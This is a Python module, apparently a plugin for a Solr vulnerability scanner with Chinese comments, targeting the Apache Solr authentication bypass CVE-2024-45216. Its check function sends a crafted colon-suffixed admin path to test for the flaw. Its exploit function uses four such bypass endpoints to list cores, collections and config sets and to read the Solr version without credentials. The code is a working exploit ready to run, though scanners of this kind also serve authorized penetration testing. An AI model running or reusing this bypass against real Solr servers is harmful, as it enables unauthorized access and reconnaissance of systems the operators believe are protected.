#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2024-45216 漏洞检测模块
Apache Solr认证绕过漏洞
"""

import logging
import json
import re

def check(scanner, core=None):
    """
    检测CVE-2024-45216认证绕过漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 尝试使用认证绕过方式访问核心列表
        resp = scanner.request("GET", "/solr/admin/cores:/admin/info/key?indexInfo=false&wt=json")
        if resp and resp.status_code == 200 and "status" in resp.json():
            return True, "存在CVE-2024-45216认证绕过漏洞"
            
        return False, "未发现CVE-2024-45216漏洞"
    except Exception as e:
        logging.error(f"检测CVE-2024-45216异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner):
    """
    利用CVE-2024-45216漏洞绕过认证
    
    Args:
        scanner: SolrScanner实例
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    try:
        # 尝试使用认证绕过方式访问敏感信息
        endpoints = [
            "/solr/admin/cores:/admin/info/key?wt=json",
            "/solr/admin/info/system:/admin/info/key?wt=json",
            "/solr/admin/collections:/admin/info/key?action=LIST&wt=json",
            "/solr/admin/configs:/admin/info/key?action=LIST&wt=json"
        ]
        
        results = []
        
        for endpoint in endpoints:
            resp = scanner.request("GET", endpoint)
            
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    results.append(f"成功访问 {endpoint}")
                    
                    # 提取关键信息
                    if "cores" in endpoint:
                        cores = list(data.get("status", {}).keys())
                        results.append(f"发现核心: {', '.join(cores)}")
                    elif "system" in endpoint:
                        version = data.get("lucene", {}).get("solr-spec-version", "未知")
                        results.append(f"Solr版本: {version}")
                    elif "collections" in endpoint:
                        collections = data.get("collections", [])
                        results.append(f"发现集合: {', '.join(collections)}")
                    elif "configs" in endpoint:
                        configs = data.get("configSets", [])
                        results.append(f"发现配置集: {', '.join(configs)}")
                except:
                    results.append(f"成功访问 {endpoint}，但无法解析响应")
            else:
                results.append(f"无法访问 {endpoint}")
        
        if any("成功访问" in result for result in results):
            return True, "\n".join(results)
        else:
            return False, "无法利用CVE-2024-45216漏洞绕过认证，可能不存在漏洞或已修复"
    except Exception as e:
        logging.error(f"利用CVE-2024-45216异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
